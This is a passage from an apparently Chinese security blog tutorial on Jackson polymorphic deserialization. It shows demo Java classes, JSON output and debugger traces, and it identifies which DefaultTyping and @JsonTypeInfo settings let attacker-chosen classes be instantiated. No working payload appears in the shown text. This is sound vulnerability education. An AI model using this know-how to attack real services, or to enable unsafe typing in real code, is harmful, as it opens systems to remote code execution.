class="line">Person.age=6, Person.name=mi1k7ea, [Lcom.mi1k7ea.Hacker;@724af044, com.mi1k7ea.MySex@4678c730</span><br></pre></td></tr></table></figure><h4 id="NON-FINAL"><a href="#NON-FINAL" class="headerlink" title="NON_FINAL"></a>NON_FINAL</h4><p>NON_FINAL：除了前面的所有特征外，包含即将被序列化的类里的全部、非final的属性，也就是相当于整个类、除final外的属性信息都需要被序列化和反序列化。</p><p>修改Person类，添加Hacker属性：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> Object object;</span><br><span class="line">    <span class="keyword">public</span> Sex sex;</span><br><span class="line">    <span class="keyword">public</span> Hacker hacker;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">"Person.age=%d, Person.name=%s, %s, %s, %s"</span>, age, name, object == <span class="keyword">null</span> ? <span class="string">"null"</span> : object, sex == <span class="keyword">null</span> ? <span class="string">"null"</span> : sex, hacker == <span class="keyword">null</span> ? <span class="string">"null"</span> : hacker);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改JSTest.java：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JSTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Person p = <span class="keyword">new</span> Person();</span><br><span class="line">        p.age = <span class="number">6</span>;</span><br><span class="line">        p.name = <span class="string">"mi1k7ea"</span>;</span><br><span class="line">        p.object = <span class="keyword">new</span> Hacker();</span><br><span class="line">        p.sex = <span class="keyword">new</span> MySex();</span><br><span class="line">        p.hacker = <span class="keyword">new</span> Hacker();</span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        <span class="comment">// 设置NON_FINAL</span></span><br><span class="line">        mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL);</span><br><span class="line"></span><br><span class="line">        String json = mapper.writeValueAsString(p);</span><br><span class="line">        System.out.println(json);</span><br><span class="line"></span><br><span class="line">        Person p2 = mapper.readValue(json, Person.class);</span><br><span class="line">        System.out.println(p2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出看到，成功对非final的hacker属性进行序列化和反序列化：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">"Person"</span>,&#123;<span class="attr">"age"</span>:<span class="number">6</span>,<span class="attr">"name"</span>:<span class="string">"mi1k7ea"</span>,<span class="attr">"object"</span>:[<span class="string">"com.mi1k7ea.Hacker"</span>,&#123;<span class="attr">"skill"</span>:<span class="string">"Jackson"</span>&#125;],<span class="attr">"sex"</span>:[<span class="string">"com.mi1k7ea.MySex"</span>,&#123;<span class="attr">"sex"</span>:<span class="number">0</span>&#125;],<span class="attr">"hacker"</span>:[<span class="string">"com.mi1k7ea.Hacker"</span>,&#123;<span class="attr">"skill"</span>:<span class="string">"Jackson"</span>&#125;]&#125;]</span><br><span class="line">Person.age=6, Person.name=mi1k7ea, com.mi1k7ea.Hacker@62ee68d8, com.mi1k7ea.MySex@735b5592, com.mi1k7ea.Hacker@58651fd0</span><br></pre></td></tr></table></figure><h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>从前面的分析知道，DefaultTyping的几个设置选项是逐渐扩大适用范围的，如下表：</p><table><thead><tr><th>DefaultTyping类型</th><th>描述说明</th></tr></thead><tbody><tr><td>JAVA_LANG_OBJECT</td><td>属性的类型为Object</td></tr><tr><td>OBJECT_AND_NON_CONCRETE</td><td>属性的类型为Object、Interface、AbstractClass</td></tr><tr><td>NON_CONCRETE_AND_ARRAYS</td><td>属性的类型为Object、Interface、AbstractClass、Array</td></tr><tr><td>NON_FINAL</td><td>所有除了声明为final之外的属性</td></tr></tbody></table><h3 id="JsonTypeInfo注解"><a href="#JsonTypeInfo注解" class="headerlink" title="@JsonTypeInfo注解"></a>@JsonTypeInfo注解</h3><p>@JsonTypeInfo注解是Jackson多态类型绑定的一种方式，支持下面5种类型的取值：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@JsonTypeInfo</span>(use = JsonTypeInfo.Id.NONE)</span><br><span class="line"><span class="meta">@JsonTypeInfo</span>(use = JsonTypeInfo.Id.CLASS)</span><br><span class="line"><span class="meta">@JsonTypeInfo</span>(use = JsonTypeInfo.Id.MINIMAL_CLASS)</span><br><span class="line"><span class="meta">@JsonTypeInfo</span>(use = JsonTypeInfo.Id.NAME)</span><br><span class="line"><span class="meta">@JsonTypeInfo</span>(use = JsonTypeInfo.Id.CUSTOM)</span><br></pre></td></tr></table></figure><p>下面我们逐个看下。</p><h4 id="JsonTypeInfo-Id-NONE"><a href="#JsonTypeInfo-Id-NONE" class="headerlink" title="JsonTypeInfo.Id.NONE"></a>JsonTypeInfo.Id.NONE</h4><p>JSTest.java：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JSTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Person p = <span class="keyword">new</span> Person();</span><br><span class="line">        p.age = <span class="number">6</span>;</span><br><span class="line">        p.name = <span class="string">"mi1k7ea"</span>;</span><br><span class="line">        p.object = <span class="keyword">new</span> Hacker();</span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line"></span><br><span class="line">        String json = mapper.writeValueAsString(p);</span><br><span class="line">        System.out.println(json);</span><br><span class="line"></span><br><span class="line">        Person p2 = mapper.readValue(json, Person.class);</span><br><span class="line">        System.out.println(p2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Person类，给object属性添加@JsonTypeInfo注解，指定为JsonTypeInfo.Id.NONE：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="meta">@JsonTypeInfo</span>(use = JsonTypeInfo.Id.NONE)</span><br><span class="line">    <span class="keyword">public</span> Object object;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">"Person.age=%d, Person.name=%s, %s"</span>, age, name, object == <span class="keyword">null</span> ? <span class="string">"null"</span> : object);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出看到，和没有设置值为JsonTypeInfo.Id.NONE的@JsonTypeInfo注解是一样的：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"age"</span>:<span class="number">6</span>,<span class="attr">"name"</span>:<span class="string">"mi1k7ea"</span>,<span class="attr">"object"</span>:&#123;<span class="attr">"skill"</span>:<span class="string">"Jackson"</span>&#125;&#125;</span><br><span class="line">Person.age=6, Person.name=mi1k7ea, &#123;skill=Jackson&#125;</span><br></pre></td></tr></table></figure><h4 id="JsonTypeInfo-Id-CLASS"><a href="#JsonTypeInfo-Id-CLASS" class="headerlink" title="JsonTypeInfo.Id.CLASS"></a>JsonTypeInfo.Id.CLASS</h4><p>修改Person类中的object属性@JsonTypeInfo注解值为JsonTypeInfo.Id.CLASS。</p><p>输出看到，object属性中多了”@class”:”com.mi1k7ea.Hacker”，即含有具体的类的信息，同时反序列化出来的object属性Hacker类对象，即能够成功对指定类型进行序列化和反序列化：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"age"</span>:<span class="number">6</span>,<span class="attr">"name"</span>:<span class="string">"mi1k7ea"</span>,<span class="attr">"object"</span>:&#123;<span class="attr">"@class"</span>:<span class="string">"com.mi1k7ea.Hacker"</span>,<span class="attr">"skill"</span>:<span class="string">"Jackson"</span>&#125;&#125;</span><br><span class="line">Person.age=6, Person.name=mi1k7ea, com.mi1k7ea.Hacker@1d057a39</span><br></pre></td></tr></table></figure><p>也就是说，在Jackson反序列化的时候如果使用了<code>JsonTypeInfo.Id.CLASS</code>修饰的话，可以通过@class的方式指定相关类，并进行相关调用。</p><h4 id="JsonTypeInfo-Id-MINIMAL-CLASS"><a href="#JsonTypeInfo-Id-MINIMAL-CLASS" class="headerlink" title="JsonTypeInfo.Id.MINIMAL_CLASS"></a>JsonTypeInfo.Id.MINIMAL_CLASS</h4><p>修改Person类中的object属性@JsonTypeInfo注解值为JsonTypeInfo.Id.MINIMAL_CLASS。</p><p>输出看到，object属性中多了”@c”:”com.mi1k7ea.Hacker”，即使用@c替代料@class，官方描述中的意思是缩短了相关类名，实际效果和JsonTypeInfo.Id.CLASS类似，能够成功对指定类型进行序列化和反序列化，都可以用于指定相关类并进行相关的调用：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"age"</span>:<span class="number">6</span>,<span class="attr">"name"</span>:<span class="string">"mi1k7ea"</span>,<span class="attr">"object"</span>:&#123;<span class="attr">"@c"</span>:<span class="string">"com.mi1k7ea.Hacker"</span>,<span class="attr">"skill"</span>:<span class="string">"Jackson"</span>&#125;&#125;</span><br><span class="line">Person.age=6, Person.name=mi1k7ea, com.mi1k7ea.Hacker@4c70fda8</span><br></pre></td></tr></table></figure><h4 id="JsonTypeInfo-Id-NAME"><a href="#JsonTypeInfo-Id-NAME" class="headerlink" title="JsonTypeInfo.Id.NAME"></a>JsonTypeInfo.Id.NAME</h4><p>修改Person类中的object属性@JsonTypeInfo注解值为JsonTypeInfo.Id.NAME。</p><p>输出看到，object属性中多了”@type”:”Hacker”，但没有具体的包名在内的类名，因此在后面的反序列化的时候会报错，也就是说这个设置值是不能被反序列化利用的：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"age"</span>:<span class="number">6</span>,<span class="attr">"name"</span>:<span class="string">"mi1k7ea"</span>,<span class="attr">"object"</span>:&#123;<span class="attr">"@type"</span>:<span class="string">"Hacker"</span>,<span class="attr">"skill"</span>:<span class="string">"Jackson"</span>&#125;&#125;</span><br><span class="line">Exception in thread "main" com.fasterxml.jackson.databind.JsonMappingException: Could not resolve type id 'Hacker' into a subtype of [simple type, class java.lang.Object]: known type ids = [Object]</span><br></pre></td></tr></table></figure><h4 id="JsonTypeInfo-Id-CUSTOM"><a href="#JsonTypeInfo-Id-CUSTOM" class="headerlink" title="JsonTypeInfo.Id.CUSTOM"></a>JsonTypeInfo.Id.CUSTOM</h4><p>其实这个值时提供给用户自定义的意思，我们是没办法直接使用的，需要手动写一个解析器才能配合使用，直接运行会抛出异常：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread &quot;main&quot; java.lang.IllegalStateException: Do not know how to construct standard type id resolver for idType: CUSTOM</span><br></pre></td></tr></table></figure><h4 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h4><p>由前面测试发现，当@JsonTypeInfo注解设置为如下值之一并且修饰的是Object类型的属性时，可以利用来触发Jackson反序列化漏洞：</p><ul><li>JsonTypeInfo.Id.CLASS</li><li>JsonTypeInfo.Id.MINIMAL_CLASS</li></ul><h2 id="0x04-反序列化中类属性方法的调用"><a href="#0x04-反序列化中类属性方法的调用" class="headerlink" title="0x04 反序列化中类属性方法的调用"></a>0x04 反序列化中类属性方法的调用</h2><p>这里只针对Jackson反序列化过程中存在的一些方法调用进行分析，并且只针对应用JacksonPolymorphicDeserialization机制的场景进行分析。</p><p>下面简单看下两个实现方式间是否有区别。</p><h3 id="当使用DefaultTyping时"><a href="#当使用DefaultTyping时" class="headerlink" title="当使用DefaultTyping时"></a>当使用DefaultTyping时</h3><p>修改Person类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> Sex sex;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">"Person.age=%d, Person.name=%s, %s"</span>, age, name, sex == <span class="keyword">null</span> ? <span class="string">"null"</span> : sex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在MySex类中的方法中添加输出：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MySex</span> <span class="keyword">implements</span> <span class="title">Sex</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sex;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MySex</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"MySex构造函数"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSex</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"MySex.getSex"</span>);</span><br><span class="line">        <span class="keyword">return</span> sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSex</span><span class="params">(<span class="keyword">int</span> sex)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"MySex.setSex"</span>);</span><br><span class="line">        <span class="keyword">this</span>.sex = sex;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改JSTest.java，只进行反序列化操作并调用无参数的enableDefaultTyping()：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JSTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        mapper.enableDefaultTyping();</span><br><span class="line"></span><br><span class="line">        String json = <span class="string">"&#123;\"age\":6,\"name\":\"mi1k7ea\",\"sex\":[\"com.mi1k7ea.MySex\",&#123;\"sex\":1&#125;]&#125;"</span>;</span><br><span class="line">        Person p2 = mapper.readValue(json, Person.class);</span><br><span class="line">        System.out.println(p2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出，看到调用了目标类的构造函数和setter方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MySex构造函数</span><br><span class="line">MySex.setSex</span><br><span class="line">Person.age=6, Person.name=mi1k7ea, com.mi1k7ea.MySex@153f5a29</span><br></pre></td></tr></table></figure><h3 id="当使用-JsonTypeInfo注解时"><a href="#当使用-JsonTypeInfo注解时" class="headerlink" title="当使用@JsonTypeInfo注解时"></a>当使用@JsonTypeInfo注解时</h3><p>修改Person类，在sex属性前添加注解：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="meta">@JsonTypeInfo</span>(use = JsonTypeInfo.Id.CLASS)</span><br><span class="line">    <span class="comment">// 或 @JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS)</span></span><br><span class="line">    <span class="keyword">public</span> Sex sex;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">"Person.age=%d, Person.name=%s, %s"</span>, age, name, sex == <span class="keyword">null</span> ? <span class="string">"null"</span> : sex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改JSTest.java，注释掉enableDefaultTyping()：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JSTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line"><span class="comment">//        mapper.enableDefaultTyping();</span></span><br><span class="line"></span><br><span class="line">        String json = <span class="string">"&#123;\"age\":6,\"name\":\"mi1k7ea\",\"sex\":[\"com.mi1k7ea.MySex\",&#123;\"sex\":1&#125;]&#125;"</span>;</span><br><span class="line">        Person p2 = mapper.readValue(json, Person.class);</span><br><span class="line">        System.out.println(p2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出看到，和使用DefaultTyping是一样的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MySex构造函数</span><br><span class="line">MySex.setSex</span><br><span class="line">Person.age=6, Person.name=mi1k7ea, com.mi1k7ea.MySex@5ae9a829</span><br></pre></td></tr></table></figure><h3 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h3><p>Jackson反序列化的过程其实就分为两步，第一步是通过构造函数生成实例，第二部是设置实例的属性值。</p><p>这里以第一个例子来进行Jackson反序列化过程的调试分析，在<code>Person p2 = mapper.readValue(json, Person.class);</code>处打上断点，同时在MySex类的构造函数、getter、setter方法中设置断点，然后开始调试。</p><p>另外，为了方便，给Person类加上个构造函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line"><span class="comment">//    @JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS)</span></span><br><span class="line">    <span class="keyword">public</span> Sex sex;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Person构造函数"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">"Person.age=%d, Person.name=%s, %s"</span>, age, name, sex == <span class="keyword">null</span> ? <span class="string">"null"</span> : sex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>BeanDeserializer.deserialize()函数中，调用了vanillaDeserialize()函数：</p><p><img src="/2019/11/13/Jackson系列一——反序列化漏洞基本原理/1.png" alt=""></p><p>跟进去，BeanDeserializer.vanillaDeserialize()函数的实现比较简单，先调用createUsingDefault()函数来调用指定类的无参构造函数来生成类实例：</p><p><img src="/2019/11/13/Jackson系列一——反序列化漏洞基本原理/2.png" alt=""></p><p><img src="/2019/11/13/Jackson系列一——反序列化漏洞基本原理/3.png" alt=""></p><p><img src="/2019/11/13/Jackson系列一——反序列化漏洞基本原理/4.png" alt=""></p><p><img src="/2019/11/13/Jackson系列一——反序列化漏洞基本原理/5.png" alt=""></p><p>BeanDeserializer.vanillaDeserialize()函数调用完无参的类的构造函数生成实例Bean后，就开始进入do while循环来循环解析键值对中的属性值并调用deserializeAndSet()函数来解析并设置Bean的属性值：</p><p><img src="/2019/11/13/Jackson系列一——反序列化漏洞基本原理/6.png" alt=""></p><p>跟进去FieldProperty.deserializeAndSet()函数中，发现调用了deserialize()函数：</p><p><img src="/2019/11/13/Jackson系列一——反序列化漏洞基本原理/7.png" alt=""></p><p>跟进该SettableBeanProperty.deserialize()函数，可以看到有两个反序列化的代码逻辑，其中if判断语句会判断当前反序列化的内容是否携带类型，若是则调用deserializeWithType()函数解析，否则直接调用deserialize()函数解析：</p><p><img src="/2019/11/13/Jackson系列一——反序列化漏洞基本原理/8.png" alt=""></p><p>这里第一个属性是age，属于Int类型，因此调用的是NumberDeserializers.deserialize()函数来获取age属性的值：</p><p><img src="/2019/11/13/Jackson系列一——反序列化漏洞基本原理/11.png" alt=""></p><p>反序列化解析得到属性值之后，回到FieldProperty.deserializeAndSet()函数中，调用属性的setter方法来设置Bean的属性值：</p><p><img src="/2019/11/13/Jackson系列一——反序列化漏洞基本原理/9.png" alt=""></p><p>接着就是回到BeanDeserializer.vanillaDeserialize()函数中的do while循环中继续解析name、sex等属性内容。</p><p>name和前面age一样的调用过程，sex属性值是包含类名的数组，因此直接调试到解析sex属性时看到，在SettableBeanProperty.deserialize()函数中进入到了调用deserializeWithType()函数解析的代码逻辑，因为此时_valueTypeDeserializer值不为null：</p><p><img src="/2019/11/13/Jackson系列一——反序列化漏洞基本原理/12.png" alt=""></p><p>跟进AbstractDeserializer.deserializeWithType()函数中，进一步调用了AsArrayTypeDeserializer.deserializeTypedFromObject()函数来解析：</p><p><img src="/2019/11/13/Jackson系列一——反序列化漏洞基本原理/13.png" alt=""></p><p>跟进去，看到调用<code>_locateTypeId()</code>函数获取到了typeId为”com.mi1k7ea.MySex”即已经获取到我们的类型名称，然后根据该typeId调用<code>_findDeserializer()</code>函数寻找对应的反序列化器：</p><p><img src="/2019/11/13/Jackson系列一——反序列化漏洞基本原理/14.png" alt=""></p><p>跟进去，其中调用findContextualValueDeserializer()找到typeId类型对应的反序列化器，然后缓存到_deserializers这个Map变量中，然后返回该反序列化器：</p><p><img src="/2019/11/13/Jackson系列一——反序列化漏洞基本原理/15.png" alt=""></p><p>接着程序回到数组类型解析的AsArrayTypeDeserializer._deserialize()函数中往下执行，用刚刚获取到的反序列化器来解析sex属性中数组内的具体类型实例：</p><p><img src="/2019/11/13/Jackson系列一——反序列化漏洞基本原理/16.png" alt=""></p><p>然后会再次调用BeanDeserializer.deserialize()-&gt;BeanDeserializer.vanillaDeserialize()来解析数组内的内容，其中调用createUsingDefault()函数的时候会调用到MySex类的无参构造函数来新建MySex类对象：</p><p><img src="/2019/11/13/Jackson系列一——反序列化漏洞基本原理/17.png" alt=""></p><p><img src="/2019/11/13/Jackson系列一——反序列化漏洞基本原理/18.png" alt=""></p><p>获取到MySex类对象后，回到vanillaDeserialize()函数中扫描到该类对象的sex属性后，调用deserializeAndSet()函数获取该属性值并设置到该实例中：</p><p><img src="/2019/11/13/Jackson系列一——反序列化漏洞基本原理/19.png" alt=""></p><p>跟进MethodProperty.deserializeAndSet()函数，先是获取sex属性值，其调用过程和前面一样；然后就是通过反射机制调用该属性的setter方法进行设置：</p><p><img src="/2019/11/13/Jackson系列一——反序列化漏洞基本原理/20.png" alt=""></p><p><img src="/2019/11/13/Jackson系列一——反序列化漏洞基本原理/21.png" alt=""></p><p>至此，整个函数调用过程大致过了一遍。使用@JsonTypeInfo注解的函数调用过程也是一样的。</p><p>简单梳理一遍，Jackson反序列化的过程为，先调用通过无参的构造函数生成目标类实例，接着是根据属性值是否是数组的形式即是否带类名来分别调用不同的函数来设置实例的属性值，其中会调用Object类型属性的构造函数和setter方法。</p><p>调用到MySex类的构造函数时的函数调用栈：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;init&gt;:6, MySex (com.mi1k7ea)</span><br><span class="line">newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:62, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:422, Constructor (java.lang.reflect)</span><br><span class="line">call:119, AnnotatedConstructor (com.fasterxml.jackson.databind.introspect)</span><br><span class="line">createUsingDefault:243, StdValueInstantiator (com.fasterxml.jackson.databind.deser.std)</span><br><span 